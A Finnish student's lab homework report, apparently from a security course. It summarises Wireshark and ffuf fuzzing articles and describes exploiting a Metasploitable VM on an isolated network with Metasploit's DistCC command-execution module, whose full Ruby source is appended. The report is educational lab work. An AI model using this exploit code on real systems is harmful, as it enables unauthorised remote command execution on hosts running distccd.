![image](https://github.com/user-attachments/assets/901f102d-c943-4b50-bebe-960de0ab03cb)![image](https://github.com/user-attachments/assets/58b99e93-d83e-4f96-babf-c7d552930f6c)# h3 Nuuskija

## Johdanto

Kotitehtävässä h3 oli tarkoituksena syventyä kotitehtävästä h2 tuttuihin Metasploitable-hyökkäyspaketteihin, viikon 45 oppitunnilla käytyihin hyökkäysten lähdekoodiin, verkkosniffaamiseen ja HackTheBoxiin sekä uutena asiana Fuzzaamiseen.

## Ennakkomateriaali (Kohta X)

Viikon aiheeseen liittyen tuli tiivistää Popovin artikkeli Wiresharkista ja Karvisen artikkeli Fuzzista.

### Wireshark Tricks

- Wiresharkin tuloksistaa voi `Analyze` ja `Statistics` -osioista löytää tärkeitä tietoja esimerkiksi pakettien tarkasta sisällöstä, käytetyistä protokollista ja DNS-kyselyistä

- Wiresharkin haku- ja suodatustyökaluja voi käyttää esimerkiksi HTTP-headerin tai hostin nimen selvittämiseen.

- Wireshark voi jopa dekryptoida HTTPS-liikennettä käyttämällä selaimen TLS sessio-avaimia tai palvelimen yksityistä avainta.

### Fuzz URL's with ffuf

- Fuzzaamisessa testataan verkkopalvelimen vasteita syöttämällä sille erinäisiä syötteitä (useimmiten satunnaisesti).

- Fuzzaamalla voidaan löytää verkkopalvelimesta piilotettuja hakemistoja, joihin ei ole muuten pääsyä.

- Ffuf on työkalu, joka suorittaa fuzzaamisen nopeasti ja automaattisesti.

### Lähteet

Popov 2024: Hacktricks: Wireshark tricks. Luettavissa: https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/wireshark-tricks#improve-your-wireshark-skills. Luettu 10.11.2024

Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf. Luettavissa: https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/. Luettu 10.11.2024

## Hyökkäys ja sorsastus (Kohdat A-B)

Aloitin tehtävän tarkistamalla tuttuun tapaan, että koneet saavat yhteyden VAIN toisiinsa HostOnly-verkossa, eivätkä muualle.

![image](https://github.com/user-attachments/assets/9512273c-df9c-4c83-9e9d-06bb99d4b51f)
![image](https://github.com/user-attachments/assets/f6dc88d7-ccce-4897-864f-d8833e2fe618)

_Yhteyskokeilu_

Tämän jälkeen avasin msf-konsolin ja valmistelin exploitin. Otin tehtävää varten itselleni uuden exploitin, eli `DistCC Daemon Command Execution` -hyökkäyksen. 

![image](https://github.com/user-attachments/assets/f0ab69b9-b989-4203-8982-b95fb128f457)

_Hyökkäyksen valinta ja konfigurointi_

Tässä vaiheessa hyödyllinen on `show options`-komento, joka näyttää ne parametrit, joita voin konfiguroida. Tässä tapauksessa olennaista on konfiguroida hyökkäyskohde `set RHOST` ja hyökkääjä `set LHOST`.

Valitettavasti tässä tapauksessa exploit ei saanut yhteyttä kohteeseen. Ohjelman antamasta palautteesta pystyin arvioida, että kyse on todennäköisesti virheellisestä payloadista. Metasploit antoi automaattisesti payloadin `cmd/unix/reverse_bash`, mutta tämä ei ole välttämättä oikea.

![image](https://github.com/user-attachments/assets/ed899a8b-b887-4df3-9aca-d779c8a5ebed)

Uusi payload, onnistunut hyökkäys

Lähdekoodi edit, liitteeissä

![image](https://github.com/user-attachments/assets/90a08f4f-7fad-4a41-b817-5fe4c21a4050)

Wireshark ping

### Lähteet

Metasploit: Metasploitable 2 Exploitability Guide. Luettavissa: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/.
Metasploit: DistCC Daemon Command Execution. Luettavissa: https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec/.

### Liitteet

_Liite 1: DistCC lähdekoodi_

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DistCC Daemon Command Execution',
      'Description'    => %q{
        This module uses a documented security weakness to execute
        arbitrary commands on any system running distccd.

      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2004-2687'],
          [ 'OSVDB', '13378' ],
          [ 'URL', 'http://distcc.samba.org/security.html'],

        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'Compat'      =>
            {

              'RequiredCmd' => 'generic perl ruby bash telnet openssl bash-tcp',
            }
        },
      'Targets'        =>
        [
          [ 'Automatic Target', { }]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2002-02-01'
      ))

      register_options(
        [
          Opt::RPORT(3632)
        ])
  end

  def check
    r = rand_text_alphanumeric(10)
    connect
    sock.put(dist_cmd("sh", "-c", "echo #{r}"))

    dtag = rand_text_alphanumeric(10)
    sock.put("DOTI0000000A#{dtag}\n")

    err, out = read_output
    if out && out.index(r)
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    connect

    distcmd = dist_cmd("sh", "-c", payload.encoded);
    sock.put(distcmd)

    dtag = rand_text_alphanumeric(10)
    sock.put("DOTI0000000A#{dtag}\n")

    err, out = read_output

    (err || "").split("\n") do |line|
      print_status("stderr: #{line}")
    end
    (out || "").split("\n") do |line|
      print_status("stdout: #{line}")
    end

    handler
    disconnect
  end

  def read_output

    res = sock.get_once(24, 5)

    if !(res and res.length == 24)
      print_status("The remote distccd did not reply to our request")
      disconnect
      return
    end

    # Check STDERR
    res = sock.get_once(4, 5)
    res = sock.get_once(8, 5)
    len = [res].pack("H*").unpack("N")[0]

    return [nil, nil] if not len
    if (len > 0)
      err = sock.get_once(len, 5)
    end

    # Check STDOUT
    res = sock.get_once(4, 5)
    res = sock.get_once(8, 5)
    len = [res].pack("H*").unpack("N")[0]

    return [err, nil] if not len
    if (len > 0)
      out = sock.get_once(len, 5)
    end
    return [err, out]

  end


  # Generate a distccd command
  def dist_cmd(*args)

    # Convince distccd that this is a compile
    args.concat(%w{# -c main.c -o main.o})

    # Set distcc 'magic fairy dust' and argument count
    res = "DIST00000001" + sprintf("ARGC%.8x", args.length)

    # Set the command arguments
    args.each do |arg|
      res << sprintf("ARGV%.8x%s", arg.length, arg)
    end

    return res
  end
end
```

